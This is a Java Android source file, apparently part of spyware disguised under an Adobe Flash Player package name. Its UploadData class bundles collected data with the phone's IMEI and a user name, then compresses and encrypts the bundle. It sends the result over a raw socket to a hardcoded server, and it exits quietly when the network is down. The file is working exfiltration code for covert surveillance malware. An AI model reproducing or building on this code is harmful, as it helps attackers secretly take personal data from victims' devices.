package com.adobe.flashplayer.network;

import java.io.OutputStream;
import java.net.Socket;
import android.util.Log;
import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.Utils;



public class UploadData implements Runnable{
	private static final String TAG ="[ljg]UploadData";
	
	private byte[] senddata = null;
	private int sendsize = 0;
	private int cmd = 0;
	private byte[] imei = null;
	private String ip = null;
	private short port = 0;
	private int packmode = 0;
	

	public UploadData(byte[] bytedata,int datasize,int cmdtype,byte[] byteimei){
		senddata = bytedata;
		sendsize = datasize;
		cmd = cmdtype;
		imei = byteimei;
		
		packmode = Public.PacketOptCryption | Public.PacketOptCompPack | Public.gOnlineType;

		this.ip = Public.SERVER_IP_ADDRESS;
		this.port = Public.SERVER_DATA_PORT;	
	}
	
	public UploadData(byte[] bytedata,int datasize,int cmdtype,byte[] byteimei,int crypt){
		
		senddata = bytedata;
		sendsize = datasize;
		cmd = cmdtype;
		imei = byteimei;
		
		packmode = crypt;

		this.ip = Public.SERVER_IP_ADDRESS;
		this.port = Public.SERVER_DATA_PORT;		
	}


	public UploadData(byte[] bytedata,int datasize,int cmdtype,byte[] byteimei,String ip,short port){
		senddata = bytedata;
		sendsize = datasize;
		cmd = cmdtype;
		imei = byteimei;
		
		packmode = Public.gOnlineType;
		
		this.ip = ip;
		this.port = port;
	}
	

	
	@Override
	public void run(){
		upload(senddata,sendsize,cmd,imei,ip,port,packmode);
	}

	public static void upload(byte[] bytedata,int datasize,int cmdtype,byte[] imeibyte){
		int mode = Public.PacketOptCryption | Public.PacketOptCompPack | Public.gOnlineType;
		upload(bytedata,datasize,cmdtype,imeibyte,Public.SERVER_IP_ADDRESS, Public.SERVER_DATA_PORT,mode);
	}


	public static void upload(byte[] bytedata,int datasize,int cmdtype,byte[] imeibyte,String ip,int port){
		int mode = Public.gOnlineType;
		upload(bytedata,datasize,cmdtype,imeibyte,ip, port,mode);
	}
	
	
	public static void upload(byte[] bytedata,int datasize,int cmdtype,byte[] imeibyte, String ip,int port,int mode){
		try{
			if(NetworkUtils.isNetworkAvailable(Public.appContext) == false){
				return;
			}

			int hdrsize = 4 + 4 + 4 + Public.IMEI_IMSI_PHONE_SIZE +Public.IMEI_IMSI_PHONE_SIZE;
			int totalsize = hdrsize + bytedata.length + 0x1000;
			byte[] senddata = new byte[totalsize];
			
			
			int sendsize = 0;
			int compsize = 0;
			if ((mode & Public.PacketOptCompPack) != 0) {
				compsize = Utils.zcompressSize(bytedata,senddata,hdrsize);
				if(compsize <= 4){
					Log.e(TAG, "zip data error");
					return;
				}
				sendsize = compsize + hdrsize;
			}else{
				sendsize = hdrsize + bytedata.length;	
				compsize = bytedata.length;
				for (int i = 0; i < bytedata.length; i++) {
					senddata[hdrsize + i] = bytedata[i];
				}
			}
				
			int offset = 0;
			byte bytesendsize[] = Utils.intToBytes(sendsize);
			for (int i = 0; i < bytesendsize.length; i++) {
				senddata[offset +i] = bytesendsize[i];
			}
			offset += bytesendsize.length;
			
			byte[] bytecmd = Utils.intToBytes(cmdtype);
			for (int i = 0; i < bytecmd.length; i++) {
				senddata[offset + i] = bytecmd[i];
			}
			offset += bytecmd.length;
			

			byte bytereserved[] = Utils.intToBytes(mode);
			for (int i = 0; i < bytereserved.length; i++) {
				senddata[offset + i] = bytereserved[i];
			}
			offset += bytereserved.length;
			
			for (int i = 0; i < imeibyte.length; i++) {
				senddata[offset + i] = imeibyte[i];
			}
			if ((mode & Public.PacketOptCryption) != 0) {
				NetworkUtils.encrypt(senddata,senddata, NetworkUtils.gKey.getBytes(),offset,offset,Public.IMEI_IMSI_PHONE_SIZE);
			}
			offset += Public.IMEI_IMSI_PHONE_SIZE;
			
			for (int i = 0; i < Public.UserName.length(); i++) {
				senddata[offset + i] = Public.UserName.getBytes()[i];
			}
			if ((mode & Public.PacketOptCryption) != 0) {
				NetworkUtils.encrypt(senddata,senddata, NetworkUtils.gKey.getBytes(),offset,offset,Public.IMEI_IMSI_PHONE_SIZE);
			}
			offset += Public.IMEI_IMSI_PHONE_SIZE;
			
			if ( (mode & Public.PacketOptCryption) != 0 ) {
				NetworkUtils.encrypt(senddata,senddata,imeibyte,offset,offset,compsize);
			}
			
			offset += compsize;
			
			Socket socket = null;
			OutputStream os = null;
			try {
				socket = new Socket(ip,port);
	            //InetSocketAddress inetaddr = new InetSocketAddress(ip, port);
	            //socket.connect(inetaddr, Public.SERVER_CMD_CONNECT_TIMEOUT);
				socket.setSoTimeout(Public.SERVER_CMD_CONNECT_TIMEOUT);
				os = socket.getOutputStream();
				os.write(senddata, 0, sendsize);
				os.flush();
				os.close();
				os = null;
				
				socket.close();	
				socket = null;
			} catch (Exception e) {
				e.printStackTrace();
				
				Log.e(TAG, "sendDataToServer exception");
				
				if (os != null) {
					os.close();
				}

				if(socket != null){
					socket.close();	
				}
			}
		} 
		catch (Exception ex) {
			ex.printStackTrace();
			String error = Utils.getExceptionDetail(ex);
			String stack = Utils.getCallStack();
			MyLog.writeLogFile("upload command:" + String.valueOf(cmdtype) + " exception:"+error + "\r\n" +
			"call stack:" + stack + "\r\n");
		}
	}
}







